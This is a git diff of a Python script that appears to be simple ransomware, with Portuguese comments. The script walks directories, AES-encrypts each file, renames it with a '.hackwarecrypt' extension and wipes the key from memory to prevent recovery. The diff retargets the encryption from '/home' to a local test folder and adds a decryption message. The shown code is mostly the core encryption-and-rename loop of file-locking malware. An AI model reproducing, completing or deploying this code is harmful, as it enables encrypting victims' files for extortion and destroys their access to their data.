@@ -1,4 +1,5 @@
 #!/usr/bin/python3.6
+# -*- coding: utf-8 -*-
 from Crypto.Cipher import AES
 from Crypto.Util import Counter
 import argparse
@@ -57,17 +58,18 @@ def main():
         cryptFn = crypt.decrypt
 
     # altere isto para a sua necessidade
-    #init_path = os.path.abspath(os.path.join(os.getcwd(), 'teste/'))
-    startdirs = ['/home']
+    init_path = os.path.abspath(os.path.join(os.getcwd(), 'teste/'))
+    startdirs = [init_path]
 
     for currentDir in startdirs:
         for filename in discovery.discover(currentDir):
             Crypter.change_files(filename, cryptFn)
             # Renomeia o arquivo pra indicar a encriptação
             if not decrypt:
-                os.rename(filename, filename+'.hackwareCrypt')
+                os.rename(filename, filename+'.hackwarecrypt')
             else:
-                os.rename(filename, filename.replace('.hackwareCrypt', ''))
+                print("Desencriptando: {}".format(filename))
+                os.rename(filename, filename.replace('.hackwarecrypt', ''))
 
     # Limpa a chave de encriptação da Memória
     # para evitar a recuperação através de ferramentas
